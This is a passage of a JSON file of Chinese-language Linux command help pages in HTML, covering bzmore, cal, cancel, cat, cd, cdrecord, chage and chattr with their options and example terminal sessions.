        "body": "<h1 id=\"bzmore\">bzmore</h1>\n<p>查看bzip2压缩过的文本文件的内容</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>bzmore命令</strong> 用于查看bzip2压缩过的文本文件的内容，当下一屏显示不下时可以实现分屏显示。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">bzmore</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要分屏显示的.bz2压缩包。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "cal",
        "des": "显示当前日历或指定日期的日历",
        "body": "<h1 id=\"cal\">cal</h1>\n<p>显示当前日历或指定日期的日历</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cal命令</strong> 用于显示当前日历，或者指定日期的日历，如果没有指定参数，则显示当前月份。</p>\n<p>一个单一的参数指定要显示的年份  (1  -  9999)  ;  注意年份必须被完全地指定:  cal 89 不会 显示1989年的日历.  两个参数表示月份 (1 - 12) 和年份.  如果没有指定参数,\n则显示当前月份的日历.</p>\n<p>一年从Jan 1 (1 月 1 日) 开始.</p>\n<p>格里高利历法改革(Gregorian Reformation)被认为发生于 1752 年 9 月 3 日.  在此之前, 多数国家已经认可这项改革(尽管有一些直到 20  世纪初才认可它).   那天之后的  10\n天在这项改革被略去了, 所以那个月的日历有点不太寻常.</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">cal <span class=\"hljs-selector-attr\">[ -mjy ]</span> <span class=\"hljs-selector-attr\">[ 月份 ]</span> <span class=\"hljs-selector-attr\">[ 年份 ]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>l <span class=\"hljs-comment\"># 显示单月输出；</span>\n<span class=\"hljs-literal\">-</span>3 <span class=\"hljs-comment\"># 显示临近三个月的日历；</span>\n<span class=\"hljs-literal\">-</span>s <span class=\"hljs-comment\"># 将星期日作为月的第一天；</span>\n<span class=\"hljs-literal\">-</span>m <span class=\"hljs-comment\"># 显示星期一作为一周的第一天..  (缺省为星期日.)</span>\n<span class=\"hljs-literal\">-</span>j <span class=\"hljs-comment\"># 显示儒略历的(Julian)日期 (以 1 为基的天数, 从 1 月 1 日开始计数) .</span>\n<span class=\"hljs-literal\">-</span>y <span class=\"hljs-comment\"># 显示当前年份的日历..</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">月：指定月份；\n年：指定年份。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>单独执行cal命令会打印出日历：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># cal</span>\n    十二月<span class=\"hljs-number\"> 2013 </span>    \n日 一 二 三 四 五 六\n<span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 2 </span><span class=\"hljs-number\"> 3 </span><span class=\"hljs-number\"> 4 </span><span class=\"hljs-number\"> 5 </span><span class=\"hljs-number\"> 6 </span> 7\n<span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 9 </span>10<span class=\"hljs-number\"> 11 </span>12<span class=\"hljs-number\"> 13 </span>14\n15<span class=\"hljs-number\"> 16 </span>17<span class=\"hljs-number\"> 18 </span>19<span class=\"hljs-number\"> 20 </span>21\n22<span class=\"hljs-number\"> 23 </span>24<span class=\"hljs-number\"> 25 </span>26<span class=\"hljs-number\"> 27 </span>28\n29<span class=\"hljs-number\"> 30 </span>31\n</code></pre>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># cal -j</span>\n        十二月<span class=\"hljs-number\"> 2013 </span>       \n  日   一   二   三   四   五   六\n335<span class=\"hljs-number\"> 336 </span>337<span class=\"hljs-number\"> 338 </span>339<span class=\"hljs-number\"> 340 </span>341\n342<span class=\"hljs-number\"> 343 </span>344<span class=\"hljs-number\"> 345 </span>346<span class=\"hljs-number\"> 347 </span>348\n349<span class=\"hljs-number\"> 350 </span>351<span class=\"hljs-number\"> 352 </span>353<span class=\"hljs-number\"> 354 </span>355\n356<span class=\"hljs-number\"> 357 </span>358<span class=\"hljs-number\"> 359 </span>360<span class=\"hljs-number\"> 361 </span>362\n363<span class=\"hljs-number\"> 364 </span>365\n</code></pre>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># cal -3</span>\n    十一月<span class=\"hljs-number\"> 2013 </span>          十二月<span class=\"hljs-number\"> 2013 </span>           一月<span class=\"hljs-number\"> 2014 </span>     \n日 一 二 三 四 五 六  日 一 二 三 四 五 六  日 一 二 三 四 五 六\n               <span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 2 </span> <span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 2 </span><span class=\"hljs-number\"> 3 </span><span class=\"hljs-number\"> 4 </span><span class=\"hljs-number\"> 5 </span><span class=\"hljs-number\"> 6 </span><span class=\"hljs-number\"> 7 </span>          <span class=\"hljs-number\"> 1 </span><span class=\"hljs-number\"> 2 </span><span class=\"hljs-number\"> 3 </span> 4\n<span class=\"hljs-number\"> 3 </span><span class=\"hljs-number\"> 4 </span><span class=\"hljs-number\"> 5 </span><span class=\"hljs-number\"> 6 </span><span class=\"hljs-number\"> 7 </span><span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 9 </span> <span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 9 </span>10<span class=\"hljs-number\"> 11 </span>12<span class=\"hljs-number\"> 13 </span>14  <span class=\"hljs-number\"> 5 </span><span class=\"hljs-number\"> 6 </span><span class=\"hljs-number\"> 7 </span><span class=\"hljs-number\"> 8 </span><span class=\"hljs-number\"> 9 </span>10 11\n10<span class=\"hljs-number\"> 11 </span>12<span class=\"hljs-number\"> 13 </span>14<span class=\"hljs-number\"> 15 </span>16 <span class=\"hljs-number\"> 15 </span>16<span class=\"hljs-number\"> 17 </span>18<span class=\"hljs-number\"> 19 </span>20<span class=\"hljs-number\"> 21 </span><span class=\"hljs-number\"> 12 </span>13<span class=\"hljs-number\"> 14 </span>15<span class=\"hljs-number\"> 16 </span>17 18\n17<span class=\"hljs-number\"> 18 </span>19<span class=\"hljs-number\"> 20 </span>21<span class=\"hljs-number\"> 22 </span>23 <span class=\"hljs-number\"> 22 </span>23<span class=\"hljs-number\"> 24 </span>25<span class=\"hljs-number\"> 26 </span>27<span class=\"hljs-number\"> 28 </span><span class=\"hljs-number\"> 19 </span>20<span class=\"hljs-number\"> 21 </span>22<span class=\"hljs-number\"> 23 </span>24 25\n24<span class=\"hljs-number\"> 25 </span>26<span class=\"hljs-number\"> 27 </span>28<span class=\"hljs-number\"> 29 </span>30 <span class=\"hljs-number\"> 29 </span>30<span class=\"hljs-number\"> 31 </span>            <span class=\"hljs-number\"> 26 </span>27<span class=\"hljs-number\"> 28 </span>29<span class=\"hljs-number\"> 30 </span>31  \n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "cancel",
        "des": "取消已存在的打印任务",
        "body": "<h1 id=\"cancel\">cancel</h1>\n<p>取消已存在的打印任务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cancel命令</strong> 用于取消已存在的打印任务。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">cancel</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：取消所有打印任务；</span>\n<span class=\"hljs-deletion\">-E：当连接到服务器时强制使用加密；</span>\n<span class=\"hljs-deletion\">-U：指定连接服务器时使用的用户名；</span>\n<span class=\"hljs-deletion\">-u：指定打印任务所属的用户；</span>\n<span class=\"hljs-deletion\">-h：指定连接的服务器名和端口号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>打印任务号：指定要取消的打印任务编号。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "cat",
        "des": "连接多个文件并打印到标准输出。",
        "body": "<h1 id=\"cat\">cat</h1>\n<p>连接多个文件并打印到标准输出。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">cat [<span class=\"hljs-symbol\">OPTION</span>]... [<span class=\"hljs-symbol\">FILE</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>显示文件内容，如果没有文件或文件为<code>-</code>则读取标准输入。</li>\n<li>将多个文件的内容进行连接并打印到标准输出。</li>\n<li>显示文件内容中的不可见字符（控制字符、换行符、制表符等）。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>FILE（可选）：要处理的文件，可以为一或多个。</p>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">长选项与短选项等价\n\n-<span class=\"hljs-string\">A</span>, <span class=\"hljs-built_in\">--show-all</span>           等价于<span class=\"hljs-string\">\"-vET\"</span>组合选项。\n-<span class=\"hljs-string\">b</span>, <span class=\"hljs-built_in\">--number-nonblank</span>    只对非空行编号，从<span class=\"hljs-string\">1</span>开始编号，覆盖<span class=\"hljs-string\">\"-n\"</span>选项。\n-<span class=\"hljs-string\">e</span>                       等价于<span class=\"hljs-string\">\"-vE\"</span>组合选项。\n-<span class=\"hljs-string\">E</span>, <span class=\"hljs-built_in\">--show-ends</span>          在每行的结尾显示<span class=\"hljs-string\">'$'</span>字符。\n-<span class=\"hljs-string\">n</span>, <span class=\"hljs-built_in\">--number</span>             对所有行编号，从<span class=\"hljs-string\">1</span>开始编号。\n-<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--squeeze-blank</span>      压缩连续的空行到一行。\n-<span class=\"hljs-string\">t</span>                       等价于<span class=\"hljs-string\">\"-vT\"</span>组合选项。\n-<span class=\"hljs-string\">T</span>, <span class=\"hljs-built_in\">--show-tabs</span>          使用<span class=\"hljs-string\">\"^I\"</span>表示<span class=\"hljs-string\">TAB</span>（制表符）。\n-<span class=\"hljs-string\">u</span>                       <span class=\"hljs-string\">POSIX</span>兼容性选项，无意义。\n-<span class=\"hljs-string\">v</span>, <span class=\"hljs-built_in\">--show-nonprinting</span>   使用<span class=\"hljs-string\">\"^\"</span>和<span class=\"hljs-string\">\"M-\"</span>符号显示控制字符，除了<span class=\"hljs-string\">LFD</span>（<span class=\"hljs-string\">line</span> <span class=\"hljs-string\">feed</span>，即换行符<span class=\"hljs-string\">'\\n'</span>）和<span class=\"hljs-string\">TAB</span>（制表符）。\n\n<span class=\"hljs-built_in\">--help</span>                   显示帮助信息并退出。\n<span class=\"hljs-built_in\">--version</span>                显示版本信息并退出。\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态为成功除非给出了非法选项或非法参数。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"># 合并显示多个文件\n<span class=\"hljs-keyword\">cat</span> ./1.<span class=\"hljs-keyword\">log</span> ./2.<span class=\"hljs-keyword\">log</span> ./3.<span class=\"hljs-keyword\">log</span>\n# 显示文件中的非打印字符、<span class=\"hljs-keyword\">tab</span>、换行符\n<span class=\"hljs-keyword\">cat</span> -A <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">log</span>\n# 压缩文件的空行\n<span class=\"hljs-keyword\">cat</span> -s <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">log</span>\n# 显示文件并在所有行开头附加行号\n<span class=\"hljs-keyword\">cat</span> -<span class=\"hljs-keyword\">n</span> <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">log</span>\n# 显示文件并在所有非空行开头附加行号\n<span class=\"hljs-keyword\">cat</span> -b <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">log</span>\n# 将标准输入的内容和文件内容一并显示\necho '######' |<span class=\"hljs-keyword\">cat</span> - <span class=\"hljs-keyword\">test</span>.<span class=\"hljs-keyword\">log</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 cat</code>或<code>info coreutils 'cat invocation'</code>。</li>\n<li>当使用<code>cat</code>命令查看<strong>体积较大的文件</strong>时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容，为了控制滚屏，可以按<code>Ctrl+s</code>键停止滚屏；按<code>Ctrl+q</code>键恢复滚屏；按<code>Ctrl+c</code>（中断）键可以终止该命令的执行，返回Shell提示符状态。</li>\n<li>建议您查看<strong>体积较大的文件</strong>时使用<code>less</code>、<code>more</code>命令或<code>emacs</code>、<code>vi</code>等文本编辑器。</li>\n</ol>\n<h3 id=\"参考链接\">参考链接</h3>\n<ol>\n<li><a href=\"https://superuser.com/questions/328054/is-there-an-lfd-key-on-my-keyboard\">Question about LFD key</a></li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "cd",
        "des": "切换用户当前工作目录。",
        "body": "<h1 id=\"cd\">cd</h1>\n<p>切换用户当前工作目录。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">cd <span class=\"hljs-comment\">[-L|<span class=\"hljs-comment\">[-P <span class=\"hljs-comment\">[-e]</span>]</span>]</span> <span class=\"hljs-comment\">[dir]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>切换工作目录至<code>dir</code>。其中<code>dir</code>的表示法可以是绝对路径或相对路径。</li>\n<li>若参数<code>dir</code>省略，则默认为使用者的shell变量<code>HOME</code>。</li>\n<li>如果<code>dir</code>指定为<code>~</code>时表示为使用者的shell变量<code>HOME</code>，<code>.</code>表示当前目录，<code>..</code>表示当前目录的上一级目录。</li>\n<li>环境变量<code>CDPATH</code>是由冒号分割的一到多个目录，你可以将常去的目录的上一级加入到<code>CDPATH</code>以便方便访问它们；如果<code>dir</code>以<code>/</code>开头那么<code>CDPATH</code>不会被使用。</li>\n<li>当<code>shopt</code>选项<code>cdable_vars</code>打开时，如果<code>dir</code>在<code>CDPATH</code>及当前目录下均不存在，那么会把它当作变量，读取它的值作为要进入的目录。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>dir（可选）：指定要切换到的目录。</p>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-L （默认值）如果要切换到的目标目录是一个符号连接，那么切换到符号连接的目录。</span>\n<span class=\"hljs-deletion\">-P 如果要切换到的目标目录是一个符号连接，那么切换到它指向的物理位置目录。</span>\n<span class=\"hljs-deletion\">-  当前工作目录将被切换到环境变量OLDPWD所表示的目录，也就是前一个工作目录。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态为成功除非无法进入指定的目录。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">cd</span>    <span class=\"hljs-comment\"># 进入用户主目录；</span>\n<span class=\"hljs-keyword\">cd</span> /  <span class=\"hljs-comment\"># 进入根目录</span>\n<span class=\"hljs-keyword\">cd</span> ~  <span class=\"hljs-comment\"># 进入用户主目录；</span>\n<span class=\"hljs-keyword\">cd</span> <span class=\"hljs-string\">..</span>  <span class=\"hljs-comment\"># 返回上级目录（若当前目录为“/“，则执行完后还在“/\"；\"..\"为上级目录的意思）；</span>\n<span class=\"hljs-keyword\">cd</span> <span class=\"hljs-string\">../..</span>  <span class=\"hljs-comment\"># 返回上两级目录；</span>\n<span class=\"hljs-keyword\">cd</span> !$  <span class=\"hljs-comment\"># 把上个命令的参数作为cd参数使用。</span>\n</code></pre>\n<p>关于切换到上一个工作目录的说明</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">cd</span> -\n<span class=\"hljs-comment\"># 命令会首先显示要切换到的目标目录，然后再进入。</span>\n<span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">${OLDPWD}</span>\n<span class=\"hljs-comment\"># 命令会直接切换到上一个工作目录。</span>\n</code></pre>\n<p>关于<code>CDPATH</code></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 设置桌面文件夹作为CDPATH的值。</span>\nCDPATH='~<span class=\"hljs-string\">/Desktop</span>'\n<span class=\"hljs-comment\"># 假设我们接下来要演示涉及到的路径~和~/Desktop下没有test3文件夹，现在新建它们。</span>\nmkdir ~<span class=\"hljs-string\">/test3</span>\nmkdir ~<span class=\"hljs-string\">/Desktop/test3</span>\n<span class=\"hljs-comment\"># 进入~目录。</span>\n<span class=\"hljs-keyword\">cd</span> ~\n<span class=\"hljs-comment\"># 进入test3目录。</span>\n<span class=\"hljs-keyword\">cd</span> test3\n<span class=\"hljs-comment\"># 执行后显示~/Desktop/test3并进入该目录，而不是~目录的test3目录。</span>\n<span class=\"hljs-comment\"># 如果CDPATH存在值，那么优先在CDPATH中查找并进入第一个匹配成功的，如果全部失败那么最后尝试当前目录。</span>\n</code></pre>\n<p>关于<code>cdable_vars</code></p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 打开选项。</span>\nshopt -s cdable_vars\n<span class=\"hljs-meta\"># 假设当前路径以及CDPATH没有名为new_var的目录。</span>\n<span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">_var</span>=<span class=\"hljs-string\">'~/Desktop'</span>\n<span class=\"hljs-meta\"># 尝试进入。</span>\ncd <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">_var</span>\n<span class=\"hljs-meta\"># 关闭选项。</span>\nshopt -u cdable_vars\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</p>\n</li>\n<li><p>建议您在编写脚本的过程中如有必要使用<code>cd</code>命令时，请增加必要的注释以用于提醒阅读者当前工作目录，以免出现诸如<code>找不到文件</code>这类问题的发生。</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "cdrecord",
        "des": "Linux系统下光盘刻录功能命令",
        "body": "<h1 id=\"cdrecord\">cdrecord</h1>\n<p>Linux系统下光盘刻录功能命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cdrecord命令</strong> 用于Linux系统下光盘刻录，它支持cd和DVD格式。linux下一般都带有cdrecord软件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">cdrecord</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-v：显示刻录光盘的详细过程；\n-eject：刻录完成后弹出光盘；\n<span class=\"hljs-attribute\">speed</span><span class=\"hljs-operator\">=</span>&lt;刻录倍速&gt;：指定光盘刻录的倍速；\n<span class=\"hljs-attribute\">dev</span><span class=\"hljs-operator\">=</span>&lt;刻录机设备号&gt;：指定使用“-scanbus”参数扫描到的刻录机的设备号；\n-scanbus：扫描系统中可用的刻录机。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>ISO文件：指定刻录光盘使用的ISO映像文件。</p>\n<h3 id=\"实例\">实例</h3>\n<p>查看系统所有 CD-R(w) 设备：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">cdrecord</span> -scanbus\n<span class=\"hljs-attribute\">scsibus0</span>:\n  <span class=\"hljs-attribute\">0</span>,<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">0</span>) *\n  <span class=\"hljs-attribute\">0</span>,<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">1</span>) *\n  <span class=\"hljs-attribute\">0</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">2</span>) *\n  <span class=\"hljs-attribute\">0</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">0</span>     <span class=\"hljs-number\">3</span>) 'HP      ' 'CD-Writer+ <span class=\"hljs-number\">9200</span> ' '<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">0</span>c' Removable CD-ROM\n</code></pre>\n<p>用iso文件刻录一张光盘：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">cdrecord</span> -v -eject speed=<span class=\"hljs-number\">4</span> dev=<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">0</span> backup.iso\n</code></pre>\n<p>参数解释</p>\n<ul>\n<li>-v：显示刻录光盘的详细过程</li>\n<li>-eject：刻完自动弹出光盘</li>\n<li>speed=4 dev=0,3,0：四速刻录到HP CD-writer设备上。</li>\n</ul>\n<p>擦写光驱：</p>\n<pre><code class=\"language-shell\">cdrecord <span class=\"hljs-attribute\">--dev</span>=0,3,0 <span class=\"hljs-attribute\">--blank</span>=fast\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "chage",
        "des": "修改帐号和密码的有效期限",
        "body": "<h1 id=\"chage\">chage</h1>\n<p>修改帐号和密码的有效期限</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chage命令</strong> 是用来修改帐号和密码的有效期限。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">chage <span class=\"hljs-selector-attr\">[选项]</span> 用户名\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-m：密码可更改的最小天数。为零时代表任何时候都可以更改密码。</span>\n<span class=\"hljs-deletion\">-M：密码保持有效的最大天数。</span>\n<span class=\"hljs-deletion\">-w：用户密码到期前，提前收到警告信息的天数。</span>\n<span class=\"hljs-deletion\">-E：帐号到期的日期。过了这天，此帐号将不可用。</span>\n<span class=\"hljs-deletion\">-d：上一次更改的日期。</span>\n<span class=\"hljs-deletion\">-i：停滞时期。如果一个密码已过期这些天，那么此帐号将不可用。</span>\n<span class=\"hljs-deletion\">-l：例出当前的设置。由非特权用户来确定他们的密码或帐号何时过期。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>可以编辑<code>/etc/login.defs</code>来设定几个参数，以后设置口令默认就按照参数设定为准：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">PASS_MAX_DAYS</span>   <span class=\"hljs-number\">99999</span>\n<span class=\"hljs-attribute\">PASS_MIN_DAYS</span>   <span class=\"hljs-number\">0</span>\n<span class=\"hljs-attribute\">PASS_MIN_LEN</span>    <span class=\"hljs-number\">5</span>\n<span class=\"hljs-attribute\">PASS_WARN_AGE</span>   <span class=\"hljs-number\">7</span>\n</code></pre>\n<p>当然在<code>/etc/default/useradd</code>可以找到如下2个参数进行设置：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># useradd defaults file</span>\n<span class=\"hljs-attr\">GROUP</span>=<span class=\"hljs-number\">100</span>\n<span class=\"hljs-attr\">HOME</span>=/home\n<span class=\"hljs-attr\">INACTIVE</span>=-<span class=\"hljs-number\">1</span>\n<span class=\"hljs-attr\">EXPIRE</span>=\n<span class=\"hljs-attr\">SHELL</span>=/bin/bash\n<span class=\"hljs-attr\">SKEL</span>=/etc/skel\n<span class=\"hljs-attr\">CREATE_MAIL_SPOOL</span>=<span class=\"hljs-literal\">yes</span>\n</code></pre>\n<p>通过修改配置文件，能对之后新建用户起作用，而目前系统已经存在的用户，则直接用chage来配置。</p>\n<p>我的服务器root帐户密码策略信息如下：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@linuxde</span> ~]<span class=\"hljs-meta\"># chage -l root</span>\n最近一次密码修改时间                    ： <span class=\"hljs-number\">3</span>月 <span class=\"hljs-number\">12</span>, <span class=\"hljs-number\">2013</span>\n密码过期时间                            ：从不\n密码失效时间                           ：从不\n帐户过期时间                           ：从不\n两次改变密码之间相距的最小天数          ：<span class=\"hljs-number\">0</span>\n两次改变密码之间相距的最大天数          ：<span class=\"hljs-number\">99999</span>\n在密码过期之前警告的天数                ：<span class=\"hljs-number\">7</span>\n</code></pre>\n<p>我可以通过如下命令修改我的密码过期时间：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@linuxde</span> ~]<span class=\"hljs-meta\"># chage -M 60 root</span>\n[root<span class=\"hljs-symbol\">@linuxde</span> ~]<span class=\"hljs-meta\"># chage -l root</span>\n最近一次密码修改时间                          ： <span class=\"hljs-number\">3</span>月 <span class=\"hljs-number\">12</span>, <span class=\"hljs-number\">2013</span>\n密码过期时间                                       ： <span class=\"hljs-number\">5</span>月 <span class=\"hljs-number\">11</span>, <span class=\"hljs-number\">2013</span>\n密码失效时间                                       ：从不\n帐户过期时间                                       ：从不\n两次改变密码之间相距的最小天数          ：<span class=\"hljs-number\">0</span>\n两次改变密码之间相距的最大天数          ：<span class=\"hljs-number\">60</span>\n在密码过期之前警告的天数                    ：<span class=\"hljs-number\">9</span>\n</code></pre>\n<p>然后通过如下命令设置密码失效时间：</p>\n<pre><code class=\"language-shell\">[<span class=\"hljs-string\">root@linuxde</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># chage -I 5 root</span>\n[<span class=\"hljs-string\">root@linuxde</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># chage -l root</span>\n<span class=\"hljs-string\">最近一次密码修改时间</span>                          <span class=\"hljs-string\">：</span> <span class=\"hljs-number\">3</span><span class=\"hljs-string\">月</span> <span class=\"hljs-number\">12</span><span class=\"hljs-string\">,</span> <span class=\"hljs-number\">2013</span>\n<span class=\"hljs-string\">密码过期时间</span>                                  <span class=\"hljs-string\">：</span> <span class=\"hljs-number\">5</span><span class=\"hljs-string\">月</span> <span class=\"hljs-number\">11</span><span class=\"hljs-string\">,</span> <span class=\"hljs-number\">2013</span>\n<span class=\"hljs-string\">密码失效时间</span>                                  <span class=\"hljs-string\">：</span> <span class=\"hljs-number\">5</span><span class=\"hljs-string\">月</span> <span class=\"hljs-number\">16</span><span class=\"hljs-string\">,</span> <span class=\"hljs-number\">2013</span>\n<span class=\"hljs-string\">帐户过期时间</span>                                  <span class=\"hljs-string\">：从不</span>\n<span class=\"hljs-string\">两次改变密码之间相距的最小天数</span>          <span class=\"hljs-string\">：0</span>\n<span class=\"hljs-string\">两次改变密码之间相距的最大天数</span>          <span class=\"hljs-string\">：60</span>\n<span class=\"hljs-string\">在密码过期之前警告的天数</span>                 <span class=\"hljs-string\">：9</span>\n</code></pre>\n<p>从上述命令可以看到，在密码过期后5天，密码自动失效，这个用户将无法登陆系统了。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "chattr",
        "des": "用来改变文件属性",
        "body": "<h1 id=\"chattr\">chattr</h1>\n<p>用来改变文件属性</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chattr命令</strong> 用来改变文件属性。这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式：</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">chattr</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-tag\">a</span>：让文件或目录仅供附加用途；\n<span class=\"hljs-selector-tag\">b</span>：不更新文件或目录的最后存取时间；\nc：将文件或目录压缩后存放；\nd：将文件或目录排除在倾倒操作之外；\n<span class=\"hljs-selector-tag\">i</span>：不得任意更动文件或目录；\ns：保密性删除文件或目录；\nS：即时更新文件或目录；\nu：预防意外删除。\n</code></pre>\n<pre><code class=\"language-shell\">-R：递归处理，将指令目录下的所有文件及子目录一并处理；\n-v&lt;版本编号&gt;：设置文件或目录版本；\n-V：显示指令执行过程；\n+&lt;属性&gt;：开启文件或目录的该项属性；\n-&lt;属性&gt;：关闭文件或目录的该项属性；\n=&lt;属性&gt;：指定文件或目录的该项属性。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>用chattr命令防止系统中某个关键文件被修改：</p>\n<pre><code class=\"language-shell\">chattr +i <span class=\"hljs-regexp\">/etc/</span>fstab\n</code></pre>\n<p>然后试一下rm、mv、rename等命令操作于该文件，都是得到Operation not permitted的结果。</p>\n<p>让某个文件只能往里面追加内容，不能删除，一些日志文件适用于这种操作：</p>\n<pre><code class=\"language-shell\">chattr +a <span class=\"hljs-regexp\">/data1/u</span>ser_act.log\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "chcon",
        "des": "修改对象（文件）的安全上下文",
